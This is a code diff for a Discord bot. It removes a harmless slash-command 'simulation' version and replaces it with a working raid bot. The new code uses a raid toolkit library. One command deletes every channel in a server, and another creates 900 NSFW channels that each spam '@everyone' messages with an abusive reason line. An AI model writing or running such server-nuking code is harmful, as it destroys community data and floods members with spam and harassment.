@@ -1,110 +1,30 @@
 
-const {
-  Client,
-  GatewayIntentBits,
-  REST,
-  Routes,
-  SlashCommandBuilder,
-  Events
-} = require("discord.js");
+const client = new Discord.Client() //setting/creating a new discord client (bot)
+const mySecret = process.env['TOKEN']
+const { keep_alive } = require("./keep_alive");
 
-const TOKEN = process.env.DISCORD_TOKEN;
+const Disc_rd = require('discord-raid-toolkit-revamp')
+const raid = new Disc_rd.RaidBot(client)
 
-if (!TOKEN) {
-  throw new Error("Set DISCORD_TOKEN in your host environment variables.");
-}
-
-const commands = [
-  new SlashCommandBuilder()
-    .setName("cook")
-    .setDescription("Check whether SZYT is online"),
-
-  new SlashCommandBuilder()
-    .setName("testnuke")
-    .setDescription("Run a safe channel and message simulation")
-    .addIntegerOption(option =>
-      option.setName("channels")
-        .setDescription("Channels to simulate (max 900)")
-        .setMinValue(1)
-        .setMaxValue(900)
-        .setRequired(true)
-    )
-    .addIntegerOption(option =>
-      option.setName("messages")
-        .setDescription("Messages per simulated channel")
-        .setMinValue(1)
-        .setMaxValue(1000000)
-        .setRequired(true)
-    )
-].map(command => command.toJSON());
-
-const client = new Client({
-  intents: [GatewayIntentBits.Guilds]
-});
-
-client.once(Events.ClientReady, async readyClient => {
-  console.log(`SZYT online as ${readyClient.user.tag}`);
-
-  try {
-    const rest = new REST({ version: "10" }).setToken(TOKEN);
-
-    await rest.put(
-      Routes.applicationCommands(readyClient.user.id),
-      { body: commands }
-    );
-
-    console.log("Global slash commands registered.");
-  } catch (error) {
-    console.error("Slash command registration failed:", error);
-  }
-});
-
-client.on(Events.InteractionCreate, async interaction => {
-  if (!interaction.isChatInputCommand()) return;
-
-  try {
-    if (interaction.commandName === "cook") {
-      await interaction.reply({
-        content: "🔥 SZYT is online!\n🛡️ Simulation mode enabled.",
-        ephemeral: true
-      });
+client.on('message', async message => {
+    if(message.content.startsWith('!deletechannels')) {
+        await raid.deleteAllChannels(message.guild.id)
     }
+})
 
-    if (interaction.commandName === "testnuke") {
-      const channels = interaction.options.getInteger("channels", true);
-      const messages = interaction.options.getInteger("messages", true);
-
-      await interaction.reply({
-        content: [
-          "🧪 **SZYT SIMULATION REPORT**",
-          "━━━━━━━━━━━━━━━━━━━━",
-          `📁 Simulated channels: **${channels.toLocaleString()}**`,
-          `💬 Messages per channel: **${messages.toLocaleString()}**`,
-          `🧮 Simulated total: **${(channels * messages).toLocaleString()}**`,
-          "━━━━━━━━━━━━━━━━━━━━",
-          "✅ Actual channels created: **0**",
-          "✅ Actual messages sent: **0**",
-          "🛡️ Simulation only"
-        ].join("\n"),
-        ephemeral: true
-      });
+client.on('message', message => {
+    if(message.content.startsWith('!channel')) {
+        raid.createChannelsLoop(message.guild.id, {
+            amount_of_created_channels: 900,
+            message_that_will_be_sent: "@everyone gg",
+            times_message_is_sent: 10,
+            channels_name: "GG MSC",
+            reason_channels: "MSC YOUR FUCKED",
+            channels_topic: "MSC",
+            nsfw: true,
+            channel_cooldown: 10
+        })
     }
-  } catch (error) {
-    console.error(error);
+})
 
-    const reply = {
-      content: "⚠️ Command failed. Check the host logs.",
-      ephemeral: true
-    };
-
-    if (interaction.replied || interaction.deferred) {
-      await interaction.followUp(reply).catch(() => {});
-    } else {
-      await interaction.reply(reply).catch(() => {});
-    }
-  }
-});
-
-client.login(TOKEN).catch(error => {
-  console.error("Login failed:", error);
-});
+client.login(process.env.TOKEN);
